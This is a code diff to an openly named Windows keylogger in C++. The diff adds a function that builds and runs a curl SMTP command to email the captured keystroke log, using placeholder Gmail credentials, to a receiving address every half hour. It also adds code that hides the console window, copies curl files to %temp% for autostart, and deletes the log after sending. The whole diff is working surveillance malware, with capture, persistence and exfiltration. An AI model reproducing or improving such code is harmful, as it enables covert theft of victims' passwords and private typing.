@@ -9,7 +9,15 @@
 #include <Lmcons.h>
 #include <iostream>
 
+
+
+//U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
 const std::string exe_name = "keylogger.exe";
+const std::string LogFileName = "data.th";
+const std::string EmailFrom = "YourEmail@gmail.com";
+const std::string EmailFromPassword = "YourPassword";
+const std::string EmailTo = "DataReciever@gmail.com";
+
 
 
 #pragma warning(disable : 4996)
@@ -19,6 +27,31 @@ bool test = 1;
 bool wymaganie = 1;
 
 using namespace std;
+
+
+
+
+void send() {
+	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"";
+	cmd += EmailFrom;
+	cmd += "\\\" --mail-rcpt \\\"";
+	cmd += EmailTo;
+	cmd += "\\\" --ssl --upload-file ";
+	cmd += LogFileName;
+	cmd += " -u ";
+	cmd += EmailFrom;
+	cmd += ":";
+	cmd += EmailFromPassword;
+	cmd += " -k --anyauth";
+	//cout << cmd;
+	system(cmd.c_str());
+
+}
+
+
+
+
+
 
 
 inline bool filexits(const std::string& name) {
@@ -53,6 +86,10 @@ void autostart() {
 		file.open("temp.bat", ios::out);
 		file << "taskkill /IM " + exe_name + " /F\n";
 		file << "move " + exe_name + " %temp%\n";
+		file <<"move curl.exe %temp%\n";
+		file << "move curl-ca-bundle.crt %temp%\n";
+		file << "move libcurl-x64.def %temp%\n";
+		file << "move libcurl-x64.dll %temp%\n";
 		file << "start  %temp%\\"+ exe_name;
 		file << "\nexit";
 		system("start temp.bat");
@@ -66,7 +103,7 @@ void autostart() {
 
 void LOG(string input) {
 	fstream LogFile;
-	LogFile.open("data.txt", fstream::app);
+	LogFile.open(LogFileName, fstream::app);
 	if (LogFile.is_open()) {
 		LogFile << input;
 		LogFile.close();
@@ -140,18 +177,26 @@ bool SpecialKeys(int S_Key) {
 
 
 
+
+
+
 int main()
 {
 
-	autostart();
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	fstream LogFile;
+	LogFile.open(LogFileName, fstream::app);
+	LogFile.close();
+    autostart();
+	send();
+	
 	string jd;
 	string jd2;
 	int wynik;
 	string wynik2;
 	string linia;
 	char KEY = 'x';
-	LogFile.open("data.txt", fstream::app);
+	LogFile.open(LogFileName, fstream::app);
 
 
 
@@ -160,7 +205,7 @@ int main()
 	time(&t);
 	tt = localtime(&t);
 	//Log at start of program
-	LogFile << endl << "###" << asctime(tt);
+	LogFile << endl <<"###" << asctime(tt);
 	wynik2 = asctime(tt)[0];
 	LogFile.close();
 
@@ -178,11 +223,13 @@ int main()
 		if ((wynik == 00) && (test == 1) || (wynik == 30) && (test == 1))
 		{
 			//saving data every half an hour
-
+			
 			fstream LogFile;
-			LogFile.open("data.txt", fstream::app);
-			LogFile << endl << "#|#" << asctime(tt);
+			LogFile.open(LogFileName, fstream::app);
+			LogFile << endl <<"#|#" << asctime(tt);
 			LogFile.close();
+			send();
+			remove(LogFileName.c_str());
 			test = 0;
 		}
 		if ((wynik != 00) && (wynik != 30))
@@ -196,9 +243,9 @@ int main()
 			if (GetAsyncKeyState(KEY) == -32767) {
 				if (SpecialKeys(KEY) == false) {
 
-					//Log to data.txt
+					//Log to LogFileName
 					fstream LogFile;
-					LogFile.open("data.txt", fstream::app);
+					LogFile.open(LogFileName, fstream::app);
 					if (LogFile.is_open()) {
 						LogFile << char(KEY);
 						LogFile.close();
